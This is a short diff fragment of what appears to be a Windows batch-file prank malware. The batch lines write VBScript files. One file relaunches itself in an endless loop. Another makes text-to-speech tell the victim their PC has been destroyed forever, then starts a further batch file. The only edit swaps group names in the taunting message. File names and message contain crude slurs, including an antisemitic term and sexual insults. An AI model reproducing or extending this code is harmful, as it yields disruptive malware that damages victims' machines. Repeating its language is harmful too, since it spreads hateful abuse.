@@ -172,7 +172,7 @@ set file=alerte_enculay.mp3
 @echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
 @echo loop>>%prenom%.vbs
 
-@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 15 18 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux birodar du 15-18.">%pute%.vbs
+@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 18 25 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux raiye du 18-25.">%pute%.vbs
 
 
 start %fdc%.vbs %MYFILES%\feuj.bat
